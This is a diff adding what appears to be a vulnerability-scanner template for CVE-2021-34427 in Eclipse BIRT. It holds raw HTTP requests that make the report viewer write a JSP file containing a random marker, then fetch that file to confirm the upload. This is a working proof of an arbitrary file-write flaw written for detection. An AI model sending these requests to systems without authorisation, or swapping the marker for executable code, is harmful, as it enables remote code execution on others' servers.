@@ -1,0 +1,47 @@
+id: cve-2021-34427
+
+info:
+  name: Eclipse BIRT Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Eclipse BIRT contains a vulnerability allowing attackers to upload arbitrary JSP files via query parameters, potentially leading to remote code execution.
+  reference:
+    - https://sec-consult.com/vulnerability-lab/advisory/remote-code-execution-bypass-eclipse-business-intelligence-reporting-birt/
+  classification:
+    cve-id: CVE-2021-34427
+    cvss-score: 9.0
+  tags: file-upload,rce
+
+variables:
+  random_filename: "{{rand_base(6)}}"
+  random_check: "{{rand_base(16)}}"
+
+http:
+  - id: check-upload
+    raw:
+      - |
+        GET /birt/document?__report=test.rptdesign&sample={{random_check}}&__document=./test/{{random_filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "test"
+
+  - id: confirm-upload
+    raw:
+      - |
+        GET /birt/test/{{random_filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{random_check}}"
